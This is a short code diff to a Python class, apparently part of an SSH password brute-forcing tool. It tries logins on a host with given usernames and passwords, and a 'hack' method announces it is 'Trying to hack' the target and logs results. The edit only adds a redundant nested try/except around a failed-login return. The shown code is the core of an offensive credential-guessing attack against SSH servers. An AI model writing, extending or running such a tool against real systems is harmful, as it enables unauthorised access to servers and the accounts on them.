@@ -18,7 +18,10 @@ class Lydia:
             client.connect(host, username=n, password=p, banner_timeout=2)
             return True
         except:
-            return False
+            try:
+                return False
+            except:
+                return False
     def hack(self):
         print("[" + colored("Thread " + self.threadnr, "red") + "][" + colored("INFO", "cyan") + "] Trying to hack " + colored(self.host, "magenta") + " now...")
         logfile = open(self.logfilepath, "a", encoding = 'utf-8', errors = 'ignore')
